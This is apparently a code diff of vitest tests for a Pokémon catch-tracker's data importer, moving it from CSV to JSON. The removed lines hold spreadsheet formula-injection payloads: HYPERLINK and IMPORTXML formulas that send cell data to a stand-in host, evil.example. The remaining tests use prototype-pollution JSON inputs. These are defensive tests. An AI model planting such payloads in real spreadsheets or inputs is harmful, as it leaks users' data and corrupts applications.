@@ -1,55 +1,24 @@
 import { describe, expect, it } from 'vitest';
 import {
-  cleanText, escapeCell, ImportError, LIMITS, makeResolver, normalizeCatches, normalizeGoals, normalizeNotes,
-  parseCount, parseCsv, parseDateTime, toCsv, unescapeCell,
-} from './csv';
+  cleanText, ImportError, LIMITS, makeResolver, normalizeCatches, normalizeGoals, normalizeNotes,
+  parseCount, parseDateTime, parseTracker,
+} from './data';
 import { parseHash } from './router';
 import { CATCH_COLUMNS } from './types';
 
 const resolve = makeResolver(['Aron', 'Litwick', 'Chandelure']);
 const blank = () => Object.fromEntries(CATCH_COLUMNS.map((c) => [c, ''])) as Record<string, string>;
 
-describe('spreadsheet formula injection', () => {
-  const payloads = [
-    '=HYPERLINK("https://evil.example/?"&A1,"click")',
-    '=IMPORTXML("https://evil.example","//a")',
-    '+1+1', '-2+3', '@SUM(A1:A2)', '\t=1+1', '\r=1+1',
-  ];
-
-  it.each(payloads)('export makes %j inert', (p) => {
-    const row = { ...blank(), id: 's001', species: 'Aron', ball: p, location: p };
-    const csv = toCsv([row], CATCH_COLUMNS);
-    const line = csv.split('\n')[1];
-    // No cell in the exported line may begin with a formula character.
-    for (const cell of line.match(/("([^"]|"")*"|[^,]*)/g)!.filter((c) => c.length)) {
-      const unquoted = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
-      expect(unquoted).not.toMatch(/^[=+\-@\t\r]/);
-    }
-  });
-
-  it('round-trips through export and import unchanged', () => {
-    const row = { ...blank(), id: 's001', species: 'Aron', caught_at: '2026-09-23 21:04', location: '=1+1 and "quotes", commas' };
-    const back = normalizeCatches(parseCsv(toCsv([row], CATCH_COLUMNS)).rows, resolve);
-    expect(back.rows[0].location).toBe(row.location);
-  });
-
-  it('leaves ordinary text and numbers alone', () => {
-    expect(escapeCell('Easy work.')).toBe('Easy work.');
-    expect(escapeCell('2000000')).toBe('2000000');
-    expect(unescapeCell("'=x")).toBe('=x');
-    expect(unescapeCell("'tis")).toBe("'tis");
-  });
-});
-
-describe('CSV parsing limits', () => {
+describe('file limits', () => {
   it('refuses files over the size limit', () => {
-    expect(() => parseCsv('species\n' + 'a'.repeat(LIMITS.fileBytes))).toThrow(ImportError);
+    expect(() => parseTracker('{"notes":"' + 'a'.repeat(LIMITS.fileBytes) + '"}')).toThrow(ImportError);
   });
 
-  it('reads at most the row limit', () => {
-    const text = 'species,caught_at\n' + Array.from({ length: LIMITS.rows + 50 }, () => 'Aron,2026-09-23').join('\n');
-    const r = normalizeCatches(parseCsv(text).rows, resolve);
-    expect(r.rows.length).toBeLessThanOrEqual(LIMITS.rows);
+  it('reads at most the entry limit', () => {
+    const list = Array.from({ length: LIMITS.rows + 50 }, () => ({ species: 'Aron', caught_at: '2026-09-23' }));
+    const raw = parseTracker(JSON.stringify({ caught: list }));
+    expect(raw.caught.length).toBe(LIMITS.rows);
+    expect(raw.issues.join(' ')).toMatch(/only the first/);
   });
 
   it('caps field lengths and says so', () => {
@@ -62,13 +31,14 @@ describe('CSV parsing limits', () => {
 });
 
 describe('prototype pollution', () => {
-  it('ignores __proto__, constructor and other unsafe headers', () => {
-    const text = 'species,__proto__,constructor,prototype,Bad Header!,caught_at\nAron,{"polluted":1},x,y,z,2026-09-23\n';
-    const parsed = parseCsv(text);
-    expect(parsed.fields).toEqual(['species', 'caught_at']);
+  it('ignores __proto__, constructor and unknown keys', () => {
+    const text = '{"__proto__":{"polluted":1},"caught":[{"species":"Aron","__proto__":{"polluted":1},"constructor":"x","evil":"y","caught_at":"2026-09-23"}]}';
+    const raw = parseTracker(text);
     expect(({} as Record<string, unknown>).polluted).toBeUndefined();
-    const r = normalizeCatches(parsed.rows, resolve);
-    expect(r.rows[0].species).toBe('Aron');
+    expect(Object.keys(raw.caught[0])).not.toContain('__proto__');
+    expect(Object.keys(raw.caught[0])).not.toContain('evil');
+    expect(Object.getPrototypeOf(raw.caught[0])).toBeNull();
+    expect(normalizeCatches(raw.caught, resolve).rows[0].species).toBe('Aron');
   });
 
   it('ignores inherited properties on input rows', () => {
